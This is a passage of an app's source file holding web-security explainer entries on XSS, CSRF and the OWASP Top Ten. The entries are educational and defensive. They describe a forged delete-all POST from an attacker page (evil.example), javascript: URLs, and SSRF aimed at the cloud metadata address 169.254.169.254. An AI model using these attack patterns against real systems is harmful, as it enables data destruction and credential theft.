      ## React protects you — mostly
      §<h2>{note.title}</h2>§ is safe: React inserts text, not HTML. The holes are:
      - §dangerouslySetInnerHTML§ — the name is the warning.
      - Rendering Markdown or **LLM output** as HTML. Models can be tricked into emitting §<script>§ or malicious links (prompt injection makes this real). Sanitise with DOMPurify, or render Markdown with a library that doesn't allow raw HTML.
      - §href={userUrl}§ with a §javascript:§ URL.

      ## Defence in depth
      - Session cookies **HttpOnly**, so even a successful XSS can't read them.
      - A **Content Security Policy** header limiting where scripts may load from.
      - Validate on input, escape on output — output is the one that counts.

      This app itself renders your notes' Markdown through DOMPurify for exactly this reason.
    `,
  }),

  entry('csrf', 'concept', WEB, 'curious', 'CSRF', {
    summary: 'Cross-site request forgery: another site makes your browser send a request to yours, cookies attached. SameSite cookies and CSRF tokens stop it.',
    aliases: ['CSRF', 'cross-site request forgery', 'CSRF token', 'XSRF'],
    tags: ['security'],
    body: doc`
      ## The attack
      You're logged in to §notes.app§. You visit §evil.example§, which contains a hidden form that auto-submits a POST to §https://notes.app/api/delete-all§. Your browser attaches your §notes.app§ cookie. The server sees a valid, logged-in request.

      The attacker can't *read* the response (CORS), but they don't need to — the damage is the side effect.

      ## Defences
      1. **SameSite cookies.** With §SameSite=Lax§ (the modern browser default), cookies aren't sent on cross-site POSTs. This alone stops most CSRF.
      2. **CSRF tokens.** The server puts a random value in the page or a readable cookie; legitimate requests echo it back in a header. Another site can't read it, so can't forge it. Flask-WTF handles this for server-rendered forms.
      3. **Require a custom header or a JSON content type** on state-changing endpoints: plain HTML forms can't send §Content-Type: application/json§ without triggering a CORS preflight.
      4. Never change state on GET.

      ## When it doesn't apply
      If your API authenticates with an §Authorization: Bearer§ header that JavaScript adds (not a cookie), the browser never attaches it automatically, so classic CSRF can't happen — but then the token is exposed to XSS instead. Security is often trading one risk for another.
    `,
  }),

  entry('owasp-top-ten', 'concept', WEB, 'curious', 'OWASP Top Ten', {
    summary: 'The most common ways web apps get broken, as ranked by the security community. Broken access control is number one; injection is still up there.',
    aliases: ['OWASP', 'OWASP Top 10', 'web security', 'broken access control', 'IDOR'],
    tags: ['security', 'checklist'],
    body: doc`
      A checklist worth reading once properly. The recurring themes, in plain terms:

      1. **Broken access control** — the top one. §GET /api/notes/43§ returns someone else's note because the route checked you're *logged in* but not that note 43 is *yours* (an "IDOR"). Every query for user data should filter by the current user: §WHERE id = %s AND owner_id = %s§.
      2. **Cryptographic failures** — passwords stored in plain text or with fast hashes, no HTTPS, secrets in the repo.
      3. **Injection** — SQL injection, command injection, and now prompt injection. Never glue untrusted text into code.
      4. **Insecure design** — no rate limits on login or on the expensive LLM endpoint.
      5. **Security misconfiguration** — Flask debug mode in production (it gives anyone a Python shell), default passwords, verbose error pages.
      6. **Vulnerable components** — old dependencies with known holes. Run §pip-audit§ and §npm audit§.
      7. **Authentication failures** — weak password rules, no lockout, sessions that never expire.
      8. **Integrity failures** — trusting unsigned data or unpinned packages (see left-pad and the xz backdoor).
      9. **Logging failures** — being breached and never noticing.
      10. **SSRF** — your server fetches a URL the user supplies, and they point it at §http://169.254.169.254§ (cloud metadata) or your internal admin panel. Very relevant for "summarise this URL" LLM features.

      For a side project, get 1, 3 and 5 right and you're ahead of most.
    `,
  }),
];
